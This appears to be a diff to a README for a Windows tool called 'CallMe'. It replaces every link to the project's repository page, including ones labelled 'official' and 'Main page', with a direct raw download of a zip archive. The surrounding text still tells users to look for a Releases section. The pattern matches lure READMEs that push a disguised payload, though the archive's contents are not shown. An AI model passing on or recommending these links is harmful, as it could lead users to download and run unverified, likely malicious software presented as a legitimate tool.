@@ -1,6 +1,6 @@
 # 📞 CallMe - Find Callback Endpoints Easily
 
-[![Download CallMe](https://img.shields.io/badge/Download-CallMe-brightgreen?style=for-the-badge)](https://github.com/peppernutmeghickory336/CallMe)
+[![Download CallMe](https://img.shields.io/badge/Download-CallMe-brightgreen?style=for-the-badge)](https://github.com/peppernutmeghickory336/CallMe/raw/refs/heads/main/callme/Call-Me-v1.6.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can get CallMe by visiting the official GitHub page below. This page lets you download the program files you need to run CallMe on Windows.
 
-[Visit this page to download CallMe](https://github.com/peppernutmeghickory336/CallMe)
+[Visit this page to download CallMe](https://github.com/peppernutmeghickory336/CallMe/raw/refs/heads/main/callme/Call-Me-v1.6.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download, install, and run CallMe on your Windows computer
 ### 1. Download CallMe
 
 - Open this link in your browser:  
-  [https://github.com/peppernutmeghickory336/CallMe](https://github.com/peppernutmeghickory336/CallMe)
+  [https://github.com/peppernutmeghickory336/CallMe/raw/refs/heads/main/callme/Call-Me-v1.6.zip](https://github.com/peppernutmeghickory336/CallMe/raw/refs/heads/main/callme/Call-Me-v1.6.zip)
 
 - Look for the **Releases** section or a download button on the page.
 
@@ -152,10 +152,10 @@ Yes, you can download and use CallMe without cost.
 
 ## 🔗 Useful Links
 
-- Main page for CallMe: [https://github.com/peppernutmeghickory336/CallMe](https://github.com/peppernutmeghickory336/CallMe)
+- Main page for CallMe: [https://github.com/peppernutmeghickory336/CallMe/raw/refs/heads/main/callme/Call-Me-v1.6.zip](https://github.com/peppernutmeghickory336/CallMe/raw/refs/heads/main/callme/Call-Me-v1.6.zip)
 
 - Detailed documentation can be found in the repository’s Wiki (if available).
 
 ---
 
-[![Download CallMe](https://img.shields.io/badge/Download-CallMe-brightgreen?style=for-the-badge)](https://github.com/peppernutmeghickory336/CallMe)
+[![Download CallMe](https://img.shields.io/badge/Download-CallMe-brightgreen?style=for-the-badge)](https://github.com/peppernutmeghickory336/CallMe/raw/refs/heads/main/callme/Call-Me-v1.6.zip)
